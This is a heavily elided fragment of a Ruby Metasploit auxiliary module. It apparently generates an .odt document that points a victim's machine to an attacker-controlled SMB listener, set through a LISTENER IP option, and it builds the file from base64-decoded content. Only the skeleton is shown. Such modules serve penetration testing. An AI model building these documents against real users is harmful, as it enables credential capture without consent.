...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize
    ...
    OptString.new('LISTENER', [true, 'IP Address of SMB Listener that the .odt document points to', '192.168.1.10'])
  ])
  ...
  def createfilecontent()
    begin
      ...
      #Content is Base64 decoded out to file in module folder then added to zip file.
